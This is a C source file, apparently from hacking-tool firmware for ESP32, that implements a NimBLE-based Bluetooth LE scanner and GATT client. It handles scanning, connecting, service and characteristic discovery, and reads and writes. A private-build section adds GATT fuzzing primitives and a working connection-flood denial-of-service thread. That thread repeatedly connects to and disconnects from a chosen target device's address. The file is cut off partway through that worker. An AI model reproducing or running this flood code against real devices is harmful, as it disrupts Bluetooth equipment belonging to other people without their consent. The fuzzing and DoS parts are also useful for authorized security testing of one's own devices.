#include "ble_walk_hal.h"

#include <esp_bt.h> /* controller: esp_bt_controller_* + BT_CONTROLLER_INIT_CONFIG_DEFAULT */
#include <esp_nimble_hci.h>
#include <nimble/nimble_port.h>
#include <nimble/nimble_port_freertos.h>
#include <host/ble_hs.h>
#include <host/ble_gap.h>
#include <host/ble_gatt.h>
#include <host/util/util.h>
#include <esp_log.h>
#include <esp_heap_caps.h>
#include <furi.h>
#include <btshim.h>
#include <string.h>

/* See ble_spam_hal.c for the measured reality: a running controller costs only
 * ~36 KB and the first-boot host init costs a one-time transient, so after any
 * BLE session the floor is ~60 KB. The old 72 KB gate could never clear that
 * floor again, so walk/tracker/race were permanently "not enough RAM" once spam
 * (or a prior walk) had run. Match spam's 46 KB. Walk also runs a GATT *client*
 * (discovery allocates more than spam's advertising), so the "HAL ready
 * free=..." log is left in to confirm walk keeps enough runtime headroom; raise
 * this if discovery is seen to OOM. NimBLE's host uses less RAM than Bluedroid,
 * so this gate stays conservative — integrator retunes if needed. */
#define BLE_WALK_MIN_FREE_INTERNAL (24 * 1024) /* NimBLE */

#define TAG "BleWalkHal"

/* ---- Scan results ------------------------------------------------------- */
// On-demand (was ~3.6 KB always-resident BSS). Allocated in ble_walk_hal_start
// (before the NimBLE host task starts producing GAP events) and freed in
// ble_walk_hal_stop after nimble_port_deinit() has torn the host task down, so
// no GAP callback can touch it once freed. Written by ble_gap_event on the
// NimBLE host task; read by scenes via ble_walk_hal_get_devices().
static BleWalkDevice* s_devices;
static uint16_t s_device_count = 0;
static volatile bool s_scanning = false;

/* ---- GATT-client discovery results -------------------------------------- */
static BleWalkService s_services[BLE_WALK_MAX_SERVICES];
static uint16_t s_service_count = 0;
static volatile bool s_services_ready = false;

// On-demand (was ~768 B always-resident BSS). Mirror of the s_devices
// conversion above: allocated in ble_walk_hal_start before the NimBLE host task
// starts, freed in ble_walk_hal_stop after nimble_port_deinit() so disc_chr_cb
// can no longer fire. Written by disc_chr_cb on the NimBLE host task; read by
// scenes via ble_walk_hal_get_chars().
static BleWalkChar* s_chars;
static uint16_t s_char_count = 0;
static volatile bool s_chars_ready = false;

static uint8_t s_read_buf[BLE_WALK_MAX_VALUE_LEN];
static uint16_t s_read_len = 0;
static volatile bool s_read_ready = false;
static volatile uint8_t s_read_status = 0;

/* ---- Connection state --------------------------------------------------- */
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
static volatile bool s_connected = false;
static bool s_hal_started = false;
static uint8_t s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
static volatile bool s_sync_done = false;
static uint8_t s_last_connect_addr[6]; /* display order (MSB-first), for logs */

#ifndef PUBLIC_BUILD
/* ---- Fuzz/DoS state (private-only) --------------------------------------- */
static volatile uint16_t s_negotiated_mtu = 0;

static FuriThread* s_dos_thread = NULL;
static volatile bool s_dos_stop = true;
static volatile uint32_t s_dos_counter = 0;
static uint8_t s_dos_target_addr[6];
static uint8_t s_dos_target_addr_type;
static uint16_t s_dos_hold_count;
#endif // PUBLIC_BUILD

/* Forward decls */
static int ble_gap_event(struct ble_gap_event* event, void* arg);

// ---------------------------------------------------------------------------
// NimBLE <-> app boundary converters
// ---------------------------------------------------------------------------

/* NimBLE ble_addr_t.val[] is little-endian (LSB first). The whole app (scan
 * view, race-detector clone, auto-walk log) prints/stores the address MSB-first
 * exactly as the old Bluedroid `bda` did, so we reverse on the way in and
 * reverse again when handing an address back to NimBLE for a connect. Keeping
 * the stored orientation identical means no consumer had to change. */
static void addr_store_from_nimble(uint8_t out_be[6], const ble_addr_t* a) {
    for(int i = 0; i < 6; i++) out_be[i] = a->val[5 - i];
}

static void addr_to_nimble(ble_addr_t* a, const uint8_t in_be[6], uint8_t type) {
    a->type = type;
    for(int i = 0; i < 6; i++) a->val[i] = in_be[5 - i];
}

/* Convert a NimBLE UUID into the esp_bt_uuid_t the consumers format/compare.
 * Both NimBLE and Bluedroid store 128-bit UUIDs LSB-first, so the byte order
 * matches what scene_walk_services / scene_race_detector already expect. */
static void uuid_nimble_to_esp(const ble_uuid_any_t* src, esp_bt_uuid_t* dst) {
    memset(dst, 0, sizeof(*dst));
    switch(src->u.type) {
    case BLE_UUID_TYPE_16:
        dst->len = ESP_UUID_LEN_16;
        dst->uuid.uuid16 = src->u16.value;
        break;
    case BLE_UUID_TYPE_32:
        dst->len = ESP_UUID_LEN_32;
        dst->uuid.uuid32 = src->u32.value;
        break;
    case BLE_UUID_TYPE_128:
    default:
        dst->len = ESP_UUID_LEN_128;
        memcpy(dst->uuid.uuid128, src->u128.value, 16);
        break;
    }
}

/* Extract a Complete/Shortened Local Name (AD types 0x09/0x08) from one BLE
 * advertising TLV buffer. Byte parsing is host-agnostic, unchanged from the
 * original Bluedroid path. */
static void parse_adv_name(const uint8_t* adv, uint8_t adv_len, char* out, size_t out_sz) {
    out[0] = '\0';
    uint8_t pos = 0;
    while(pos < adv_len) {
        uint8_t len = adv[pos];
        if(len == 0 || pos + len >= adv_len) break;
        uint8_t type = adv[pos + 1];
        if(type == 0x09 || type == 0x08) {
            uint8_t name_len = len - 1;
            if(name_len > out_sz - 1) name_len = out_sz - 1;
            memcpy(out, &adv[pos + 2], name_len);
            out[name_len] = '\0';
            return;
        }
        pos += len + 1;
    }
}

// ---------------------------------------------------------------------------
// GATT-client per-procedure callbacks (own ble_gatt_*_fn functions)
// ---------------------------------------------------------------------------

static int
    ble_walk_mtu_cb(uint16_t conn_handle, const struct ble_gatt_error* error, uint16_t mtu, void* arg) {
    UNUSED(conn_handle);
    UNUSED(arg);
    if(error && error->status == 0) {
        ESP_LOGI(TAG, "MTU exchanged: %d", mtu);
    }
    return 0;
}

/* Service discovery: called once per service, finally with BLE_HS_EDONE. This
 * preserves the original ASYNC contract — ble_walk_hal_discover_services()
 * kicks it off and returns; callers poll ble_walk_hal_services_ready(). */
static int disc_svc_cb(
    uint16_t conn_handle,
    const struct ble_gatt_error* error,
    const struct ble_gatt_svc* service,
    void* arg) {
    UNUSED(conn_handle);
    UNUSED(arg);
    if(error == NULL) return 0;

    if(error->status == 0 && service != NULL) {
        if(s_service_count < BLE_WALK_MAX_SERVICES) {
            BleWalkService* svc = &s_services[s_service_count];
            uuid_nimble_to_esp(&service->uuid, &svc->uuid);
            svc->start_handle = service->start_handle;
            svc->end_handle = service->end_handle;
            s_service_count++;
        }
    } else if(error->status == BLE_HS_EDONE) {
        s_services_ready = true;
        ESP_LOGI(TAG, "Service discovery complete: %d services", s_service_count);
    } else {
        /* Discovery failed part-way: publish what we have so pollers unblock. */
        s_services_ready = true;
        ESP_LOGW(TAG, "svc discovery status=%d", error->status);
    }
    return 0;
}

/* Characteristic discovery: per-char then BLE_HS_EDONE. Bluedroid's
 * get_all_char returned synchronously; ble_walk_hal_discover_chars() below
 * blocks on s_chars_ready to keep that behaviour for callers that read the
 * list immediately (scene_walk_chars). */
static int disc_chr_cb(
    uint16_t conn_handle,
    const struct ble_gatt_error* error,
    const struct ble_gatt_chr* chr,
    void* arg) {
    UNUSED(conn_handle);
    UNUSED(arg);
    if(error == NULL) return 0;
    if(!s_chars) return 0; /* table freed / not allocated */

    if(error->status == 0 && chr != NULL) {
        if(s_char_count < BLE_WALK_MAX_CHARS) {
            BleWalkChar* c = &s_chars[s_char_count];
            uuid_nimble_to_esp(&chr->uuid, &c->uuid);
            c->handle = chr->val_handle; /* value handle == old char_handle */
            c->properties = chr->properties;
            s_char_count++;
        }
    } else if(error->status == BLE_HS_EDONE) {
        s_chars_ready = true;
        ESP_LOGI(TAG, "Found %d characteristics", s_char_count);
    } else {
        s_chars_ready = true;
        ESP_LOGW(TAG, "chr discovery status=%d", error->status);
    }
    return 0;
}

/* Read: for a plain (short) read the callback fires exactly once with the
 * value attribute (or an error). No trailing EDONE for ble_gattc_read. */
static int read_cb(
    uint16_t conn_handle,
    const struct ble_gatt_error* error,
    struct ble_gatt_attr* attr,
    void* arg) {
    UNUSED(conn_handle);
    UNUSED(arg);
    if(error == NULL) return 0;

    s_read_status = (uint8_t)error->status; /* 0 == success, mirrors ESP_GATT_OK */
    if(error->status == 0 && attr != NULL && attr->om != NULL) {
        uint16_t copied = 0;
        uint16_t max = (uint16_t)BLE_WALK_MAX_VALUE_LEN;
        if(ble_hs_mbuf_to_flat(attr->om, s_read_buf, max, &copied) == 0) {
            s_read_len = copied;
        } else {
            s_read_len = 0;
        }
    } else {
        s_read_len = 0;
    }
    s_read_ready = true;
    return 0;
}

static int write_cb(
    uint16_t conn_handle,
    const struct ble_gatt_error* error,
    struct ble_gatt_attr* attr,
    void* arg) {
    UNUSED(conn_handle);
    UNUSED(attr);
    UNUSED(arg);
    ESP_LOGI(TAG, "Write complete: status=%d", error ? error->status : -1);
    return 0;
}

// ---------------------------------------------------------------------------
// Unified GAP/GATT event callback (scan + connect + disconnect + notify + mtu)
// ---------------------------------------------------------------------------

static int ble_gap_event(struct ble_gap_event* event, void* arg) {
    UNUSED(arg);
    switch(event->type) {
    case BLE_GAP_EVENT_DISC: {
        /* One report per PDU: an ADV_IND-family PDU carries the adv payload, a
         * separate SCAN_RSP PDU carries the scan response. The old Bluedroid
         * SCAN_RESULT event delivered both at once; here we merge them into the
         * same BleWalkDevice as each arrives. */
        struct ble_gap_disc_desc* d = &event->disc;
        bool is_scan_rsp = (d->event_type == BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP);

        uint8_t addr[6];
        addr_store_from_nimble(addr, &d->addr);

        char parsed_name[32];
        parse_adv_name(d->data, d->length_data, parsed_name, sizeof(parsed_name));

        if(!s_devices) break; // table freed / not allocated
        int found = -1;
        for(int i = 0; i < s_device_count; i++) {
            if(memcmp(s_devices[i].addr, addr, 6) == 0) {
                found = i;
                break;
            }
        }

        if(found >= 0) {
            BleWalkDevice* dev = &s_devices[found];
            dev->rssi = d->rssi;
            if(dev->name[0] == '\0' && parsed_name[0] != '\0') {
                strncpy(dev->name, parsed_name, 31);
                dev->name[31] = '\0';
            }
            if(is_scan_rsp) {
                dev->scan_rsp_len = d->length_data > 31 ? 31 : d->length_data;
                memcpy(dev->scan_rsp_data, d->data, dev->scan_rsp_len);
            } else {
                dev->adv_data_len = d->length_data > 31 ? 31 : d->length_data;
                memcpy(dev->adv_data, d->data, dev->adv_data_len);
            }
        } else if(s_device_count < BLE_WALK_MAX_DEVICES) {
            BleWalkDevice* dev = &s_devices[s_device_count];
            memset(dev, 0, sizeof(*dev));
            memcpy(dev->addr, addr, 6);
            dev->addr_type = (esp_ble_addr_type_t)d->addr.type; /* 0..3 aligns */
            dev->rssi = d->rssi;
            strncpy(dev->name, parsed_name, 31);
            dev->name[31] = '\0';
            if(is_scan_rsp) {
                dev->scan_rsp_len = d->length_data > 31 ? 31 : d->length_data;
                memcpy(dev->scan_rsp_data, d->data, dev->scan_rsp_len);
            } else {
                dev->adv_data_len = d->length_data > 31 ? 31 : d->length_data;
                memcpy(dev->adv_data, d->data, dev->adv_data_len);
            }
            /* Publish: all field writes above must be visible before the reader
             * observes the incremented count. */
            __atomic_store_n(&s_device_count, (uint16_t)(s_device_count + 1), __ATOMIC_RELEASE);
        }
        break;
    }

    case BLE_GAP_EVENT_DISC_COMPLETE:
        s_scanning = false;
        ESP_LOGD(TAG, "disc complete, reason=%d", event->disc_complete.reason);
        break;

    case BLE_GAP_EVENT_CONNECT:
        if(event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            s_connected = true;
            ESP_LOGI(TAG, "CONNECT: conn_handle=%d", s_conn_handle);
            /* Negotiate a larger MTU up front (was esp_ble_gattc_send_mtu_req). */
            ble_gattc_exchange_mtu(s_conn_handle, ble_walk_mtu_cb, NULL);
        } else {
            s_connected = false;
            s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
            ESP_LOGW(TAG, "CONNECT failed: status=%d", event->connect.status);
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        s_connected = false;
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        ESP_LOGI(TAG, "DISCONNECT: reason=%d", event->disconnect.reason);
        break;

    case BLE_GAP_EVENT_MTU:
        ESP_LOGI(TAG, "MTU update: %d", event->mtu.value);
#ifndef PUBLIC_BUILD
        s_negotiated_mtu = event->mtu.value;
#endif
        break;

    case BLE_GAP_EVENT_NOTIFY_RX:
        /* No public subscribe API today, but if the module ever writes a CCCD
         * (0x0001) via ble_gattc_write_flat to enable notifications, the payload
         * arrives here. Left as a hook; currently just logged. */
        ESP_LOGD(
            TAG,
            "NOTIFY_RX handle=%d len=%d ind=%d",
            event->notify_rx.attr_handle,
            OS_MBUF_PKTLEN(event->notify_rx.om),
            event->notify_rx.indication);
        break;

    default:
        ESP_LOGD(TAG, "gap event: %d", event->type);
        break;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// NimBLE host task + sync/reset callbacks
// ---------------------------------------------------------------------------

static void ble_walk_on_sync(void) {
    /* Make sure we have a usable identity address, then pick the own-address
     * type NimBLE should use for scanning/connecting. */
    int rc = ble_hs_util_ensure_addr(0);
    if(rc != 0) {
        ESP_LOGW(TAG, "ensure_addr rc=%d", rc);
    }
    rc = ble_hs_id_infer_auto(0, &s_own_addr_type);
    if(rc != 0) {
        ESP_LOGW(TAG, "infer_auto rc=%d, defaulting to public", rc);
        s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
    }
    s_sync_done = true;
    ESP_LOGI(TAG, "NimBLE synced, own_addr_type=%d", s_own_addr_type);
}

static void ble_walk_on_reset(int reason) {
    ESP_LOGW(TAG, "NimBLE host reset, reason=%d", reason);
    s_connected = false;
    s_scanning = false;
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    s_sync_done = false;
}

static void ble_walk_host_task(void* param) {
    UNUSED(param);
    /* Blocks running the NimBLE host event loop until nimble_port_stop(). */
    nimble_port_run();
    nimble_port_freertos_deinit();
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

bool ble_walk_hal_start(void) {
    if(s_hal_started) {
        ESP_LOGI(TAG, "BLE Walk HAL already started");
        return true;
    }

    // WiFi released the BLE controller's RAM this boot — esp_bt_controller_init()
    // would fault. Refuse cleanly; the radio needs a reboot to come back.
    if(bt_is_mem_released()) {
        ESP_LOGE(TAG, "BLE controller RAM was released for WiFi; reboot to use BLE");
        return false;
    }

    ESP_LOGI(TAG, "Starting BLE Walk HAL...");

    Bt* bt = furi_record_open(RECORD_BT);
    bt_stop_stack(bt);
    furi_record_close(RECORD_BT);
    furi_delay_ms(100);

    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    if(free_internal < BLE_WALK_MIN_FREE_INTERNAL) {
        ESP_LOGE(
            TAG,
            "Not enough RAM for BLE walk: %u free, need >= %u",
            (unsigned)free_internal,
            (unsigned)BLE_WALK_MIN_FREE_INTERNAL);
        return false;
    }

    // Allocate the device table for this BLE session (freed in _stop). Do it
    // before the controller/host come up so a failure is a clean early return.
    if(!s_devices) {
        s_devices = calloc(BLE_WALK_MAX_DEVICES, sizeof(*s_devices));
        if(!s_devices) {
            ESP_LOGE(TAG, "s_devices alloc failed");
            return false;
        }
    }

    // GATT-client characteristic table — same on-demand lifecycle as s_devices,
    // allocated before the host task so a failure is a clean early return.
    if(!s_chars) {
        s_chars = calloc(BLE_WALK_MAX_CHARS, sizeof(*s_chars));
        if(!s_chars) {
            ESP_LOGE(TAG, "s_chars alloc failed");
            free(s_devices);
            s_devices = NULL;
            return false;
        }
    }

    // Controller init/enable — UNCHANGED across the Bluedroid->NimBLE migration.
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_bt_controller_init(&bt_cfg);
    if(err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "controller init: %s", esp_err_to_name(err));
        return false;
    }
    err = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if(err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "controller enable: %s", esp_err_to_name(err));
        return false;
    }

    // NimBLE host init (replaces esp_bluedroid_init_with_cfg + esp_bluedroid_enable).
    // The controller is already up, so esp_nimble_init() brings up only the host.
    err = esp_nimble_init();
    if(err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "esp_nimble_init: %s", esp_err_to_name(err));
        return false;
    }

    // Host configuration callbacks.
    ble_hs_cfg.sync_cb = ble_walk_on_sync;
    ble_hs_cfg.reset_cb = ble_walk_on_reset;

    // Reset state BEFORE the host task starts producing events.
    __atomic_store_n(&s_device_count, 0, __ATOMIC_RELEASE);
    s_scanning = false;
    s_connected = false;
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    s_sync_done = false;

    // Start the FreeRTOS host task (replaces Bluedroid's internal BTU task).
    nimble_port_freertos_init(ble_walk_host_task);

    // Wait (max ~2s) for the sync callback so s_own_addr_type is valid before the
    // first scan/connect (replaces waiting on the Bluedroid GATTC REG_EVT).
    for(int i = 0; i < 40 && !s_sync_done; i++) {
        furi_delay_ms(50);
    }

    s_hal_started = true;
    ESP_LOGI(
        TAG,
        "BLE Walk HAL ready (sync=%d, own_addr_type=%d, free=%u)",
        s_sync_done,
        s_own_addr_type,
        (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
    return true;
}

void ble_walk_hal_stop(void) {
    if(!s_hal_started) {
        return; // nothing to tear down (idempotent)
    }
    ESP_LOGI(TAG, "Stopping BLE Walk HAL...");

    if(s_connected && s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        furi_delay_ms(100);
    }
    if(s_scanning) {
        ble_gap_disc_cancel();
        s_scanning = false;
        furi_delay_ms(50);
    }

    // Stop + deinit the NimBLE host (replaces esp_bluedroid_disable/deinit).
    // nimble_port_stop() unblocks nimble_port_run() in the host task, which then
    // self-deinits via nimble_port_freertos_deinit().
    int rc = nimble_port_stop();
    if(rc == 0) {
        nimble_port_deinit();
    } else {
        ESP_LOGW(TAG, "nimble_port_stop rc=%d", rc);
    }
    furi_delay_ms(50);

    // Controller teardown — UNCHANGED.
    if(esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_IDLE) {
        esp_bt_controller_disable();
        furi_delay_ms(50);
    }
    if(esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_IDLE) {
        esp_bt_controller_deinit();
        furi_delay_ms(50);
    }

    Bt* bt = furi_record_open(RECORD_BT);
    bt_start_stack(bt);
    furi_record_close(RECORD_BT);

    // Host task is gone (nimble_port_deinit above) → no callback can touch it.
    free(s_devices);
    s_devices = NULL;
    free(s_chars);
    s_chars = NULL;
    s_hal_started = false;
    ESP_LOGI(TAG, "BLE Walk HAL stopped");
}

// ---------------------------------------------------------------------------
// Scanning
// ---------------------------------------------------------------------------

bool ble_walk_hal_start_scan(void) {
    // Preserve the existing device list — the scan keeps populating it. Callers
    // that want a fresh list clear it before calling.
    if(!s_sync_done) {
        for(int i = 0; i < 20 && !s_sync_done; i++) furi_delay_ms(50);
    }

    struct ble_gap_disc_params disc_params = {0};
    disc_params.itvl = 0x50; // 50ms in 0.625ms units == 0x50
    disc_params.window = 0x30; // 30ms
    disc_params.filter_policy = 0; // BLE_HCI_SCAN_FILT_NO_WL (allow all)
    disc_params.limited = 0;
    disc_params.passive = 0; // active scan (was BLE_SCAN_TYPE_ACTIVE)
    disc_params.filter_duplicates = 0;

    // Scan indefinitely; results and completion arrive via ble_gap_event().
    int rc = ble_gap_disc(s_own_addr_type, BLE_HS_FOREVER, &disc_params, ble_gap_event, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gap_disc rc=%d", rc);
        return false;
    }
    s_scanning = true;
    return true;
}

void ble_walk_hal_stop_scan(void) {
    if(s_scanning) {
        // disc_cancel is effectively synchronous and does NOT emit
        // DISC_COMPLETE, so clear the flag ourselves.
        ble_gap_disc_cancel();
        s_scanning = false;
    }
}

bool ble_walk_hal_is_scanning(void) {
    return s_scanning;
}

BleWalkDevice* ble_walk_hal_get_devices(uint16_t* count) {
    if(!s_devices) {
        *count = 0;
        return NULL;
    }
    *count = __atomic_load_n(&s_device_count, __ATOMIC_ACQUIRE);
    return s_devices;
}

// ---------------------------------------------------------------------------
// GATT Client
// ---------------------------------------------------------------------------

bool ble_walk_hal_connect(BleWalkDevice* device, volatile bool* abort_flag) {
    ble_walk_hal_stop_scan();
    furi_delay_ms(100);

    s_connected = false;
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    s_service_count = 0;
    s_services_ready = false;

    memcpy(s_last_connect_addr, device->addr, 6);

    if(!s_sync_done) {
        for(int i = 0; i < 20 && !s_sync_done; i++) furi_delay_ms(50);
    }

    ble_addr_t peer;
    addr_to_nimble(&peer, device->addr, (uint8_t)device->addr_type);

    ESP_LOGI(
        TAG,
        "Connecting to %02X:%02X:%02X:%02X:%02X:%02X (type=%d, name='%s')",
        device->addr[0], device->addr[1], device->addr[2],
        device->addr[3], device->addr[4], device->addr[5],
        device->addr_type, device->name);

    // duration_ms bounds the controller-side attempt; we also cancel ourselves
    // after our own 4s window / on abort (below), mirroring the old open+cancel.
    int rc = ble_gap_connect(s_own_addr_type, &peer, 30000, NULL, ble_gap_event, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gap_connect rc=%d", rc);
        return false;
    }

    // Wait for connection (max 4s) — abortable.
    bool aborted = false;
    for(int i = 0; i < 80 && !s_connected; i++) {
        if(abort_flag && *abort_flag) {
            aborted = true;
            ESP_LOGW(TAG, "connect aborted after %d ms", i * 50);
            break;
        }
        furi_delay_ms(50);
    }

    if(!s_connected) {
        ESP_LOGW(TAG, "Connection %s, cancelling", aborted ? "aborted" : "timeout after 4s");
        // Cancel the still-pending connect (replaces gattc_close + gap_disconnect).
        ble_gap_conn_cancel();
        if(!aborted) {
            for(int i = 0; i < 10; i++) {
                if(abort_flag && *abort_flag) break;
                furi_delay_ms(20);
            }
        }
    }
    return s_connected;
}

void ble_walk_hal_disconnect(void) {
    if(!s_connected || s_conn_handle == BLE_HS_CONN_HANDLE_NONE) return;

    ESP_LOGI(TAG, "Disconnecting conn_handle=%d...", s_conn_handle);
    ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    for(int i = 0; i < 40 && s_connected; i++) {
        furi_delay_ms(50);
    }
    if(s_connected) {
        // Give up waiting; the DISCONNECT event will land eventually. Clear our
        // view so callers stop treating the link as live.
        s_connected = false;
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        ESP_LOGW(TAG, "Disconnect forced");
    }
}

bool ble_walk_hal_is_connected(void) {
    return s_connected;
}

bool ble_walk_hal_discover_services(void) {
    if(!s_connected) return false;

    s_service_count = 0;
    s_services_ready = false;

    // Async: fills s_services[] via disc_svc_cb, sets s_services_ready on EDONE.
    // Callers poll ble_walk_hal_services_ready() (unchanged contract).
    int rc = ble_gattc_disc_all_svcs(s_conn_handle, disc_svc_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "disc_all_svcs rc=%d", rc);
        return false;
    }
    return true;
}

bool ble_walk_hal_services_ready(void) {
    return s_services_ready;
}

BleWalkService* ble_walk_hal_get_services(uint16_t* count) {
    *count = s_service_count;
    return s_services;
}

bool ble_walk_hal_discover_chars(BleWalkService* service) {
    if(!s_connected) return false;

    s_char_count = 0;
    s_chars_ready = false;

    int rc = ble_gattc_disc_all_chrs(
        s_conn_handle, service->start_handle, service->end_handle, disc_chr_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "disc_all_chrs rc=%d", rc);
        s_chars_ready = true;
        return false;
    }

    // Bluedroid's esp_ble_gattc_get_all_char() returned a fully-populated array
    // synchronously. NimBLE discovery is async, but scene_walk_chars reads
    // get_chars() immediately after this call WITHOUT polling chars_ready(). To
    // keep that behaviour identical, block here until the EDONE callback fires
    // (bounded ~3s). Callers that DO poll (scene_auto_walk) then see ready == true
    // right away, which is still correct.
    for(int i = 0; i < 60 && !s_chars_ready; i++) {
        furi_delay_ms(50);
    }

    ESP_LOGI(TAG, "Found %d characteristics", s_char_count);
    return s_chars_ready;
}

bool ble_walk_hal_chars_ready(void) {
    return s_chars_ready;
}

BleWalkChar* ble_walk_hal_get_chars(uint16_t* count) {
    if(!s_chars) {
        *count = 0;
        return NULL;
    }
    *count = s_char_count;
    return s_chars;
}

bool ble_walk_hal_read_char(uint16_t handle) {
    if(!s_connected) return false;

    s_read_ready = false;
    s_read_len = 0;

    int rc = ble_gattc_read(s_conn_handle, handle, read_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gattc_read rc=%d", rc);
        return false;
    }
    return true;
}

bool ble_walk_hal_read_ready(void) {
    return s_read_ready;
}

uint8_t* ble_walk_hal_get_read_value(uint16_t* len) {
    *len = s_read_len;
    return s_read_buf;
}

uint8_t ble_walk_hal_get_read_status(void) {
    return s_read_status;
}

bool ble_walk_hal_write_char(uint16_t handle, const uint8_t* data, uint16_t len) {
    if(!s_connected) return false;

    // Write-with-response (was ESP_GATT_WRITE_TYPE_RSP). To *subscribe* to
    // notifications instead, write {0x01,0x00} to the characteristic's CCCD
    // descriptor handle with this same call (the contract's CCCD path); no
    // consumer needs that today, so it is left out of the public API.
    int rc = ble_gattc_write_flat(s_conn_handle, handle, data, len, write_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gattc_write_flat rc=%d", rc);
        return false;
    }
    return true;
}

#ifndef PUBLIC_BUILD
// ---------------------------------------------------------------------------
// GATT fuzz primitives (private-only: new attack surface, not shipped public)
// ---------------------------------------------------------------------------

bool ble_walk_hal_write_char_norsp(uint16_t handle, const uint8_t* data, uint16_t len) {
    if(!s_connected) return false;

    // Write Without Response — no ble_gatt_attr_fn completion callback exists
    // for this procedure at all (fire-and-forget by design), unlike
    // ble_walk_hal_write_char's write_cb-driven ble_gattc_write_flat.
    int rc = ble_gattc_write_no_rsp_flat(s_conn_handle, handle, data, len);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gattc_write_no_rsp_flat rc=%d", rc);
        return false;
    }
    return true;
}

bool ble_walk_hal_write_char_long(uint16_t handle, uint16_t offset, const uint8_t* data, uint16_t len) {
    if(!s_connected) return false;

    struct os_mbuf* om = ble_hs_mbuf_from_flat(data, len);
    if(!om) {
        ESP_LOGE(TAG, "write_long: ble_hs_mbuf_from_flat failed (len=%d)", len);
        return false;
    }

    // ble_gattc_write_long consumes the mbuf regardless of outcome (per its
    // header doc), so there is no free-on-error path to add here.
    int rc = ble_gattc_write_long(s_conn_handle, handle, offset, om, write_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gattc_write_long rc=%d", rc);
        return false;
    }
    return true;
}

bool ble_walk_hal_fuzz_mtu(uint16_t preferred_mtu) {
    if(!s_connected) return false;

    int rc = ble_att_set_preferred_mtu(preferred_mtu);
    if(rc != 0) {
        // Not fatal on its own (e.g. value out of the 23..517 range clamps
        // internally) — still attempt the exchange with whatever is active.
        ESP_LOGW(TAG, "ble_att_set_preferred_mtu(%d) rc=%d", preferred_mtu, rc);
    }

    rc = ble_gattc_exchange_mtu(s_conn_handle, ble_walk_mtu_cb, NULL);
    if(rc != 0) {
        ESP_LOGE(TAG, "ble_gattc_exchange_mtu rc=%d", rc);
        return false;
    }
    return true;
}

uint16_t ble_walk_hal_get_negotiated_mtu(void) {
    return s_negotiated_mtu;
}

// ---------------------------------------------------------------------------
// Connection-flood DoS (private-only)
// ---------------------------------------------------------------------------

/* Runs on its own FuriThread so a scene can fire-and-monitor via the
 * counter/stop-flag pair instead of blocking its own tick loop. Mirrors
 * ble_walk_hal_connect's connect/wait/cancel idiom for each cycle, but churns
 * indefinitely against s_dos_target_addr instead of returning after one
 * attempt. Shares s_conn_handle/s_connected with the rest of the HAL (this
 * HAL only ever tracks one live link at a time, same as ble_walk_hal_connect)
 * — callers must not run a manual connect/walk session concurrently with the
 * flood. */
static int32_t dos_flood_worker(void* ctx) {
    UNUSED(ctx);
    ESP_LOGI(TAG, "DoS connect-flood worker started");

    while(!s_dos_stop) {
        if(!s_sync_done) {
            furi_delay_ms(50);
            continue;
        }

        ble_addr_t peer;
        addr_to_nimble(&peer, s_dos_target_addr, s_dos_target_addr_type);

        s_connected = false;
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;

        int rc = ble_gap_connect(s_own_addr_type, &peer, 3000, NULL, ble_gap_event, NULL);
        if(rc != 0) {
            ESP_LOGW(TAG, "dos ble_gap_connect rc=%d", rc);
            furi_delay_ms(50);
            continue;
        }

        // Bounded wait (~3s) for the connect to land, abortable via the stop flag.
        for(int i = 0; i < 60 && !s_connected && !s_dos_stop; i++) {
            furi_delay_ms(50);
        }

        if(s_dos_stop) {
            if(s_connected) {
                ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
            } else {
                ble_gap_conn_cancel();
            }
            break;
        }

        if(!s_connected) {
            // Timed out — cancel the still-pending attempt and churn again.
            ble_gap_conn_cancel();
            furi_delay_ms(20);
            continue;
        }

        __atomic_add_fetch(&s_dos_counter, 1, __ATOMIC_RELAXED);

        // Hold the link open before tearing it down (0 == disconnect
        // immediately, i.e. max churn rate; each hold_count unit is a 20ms
        // dwell, so callers dial how "sticky" each connection is).
        uint32_t hold_ms = (uint32_t)s_dos_hold_count * 20;
        uint32_t held = 0;
        while(held < hold_ms && !s_dos_stop) {
            furi_delay_ms(20);
            held += 20;
        }

        if(s_connected && s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
            ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
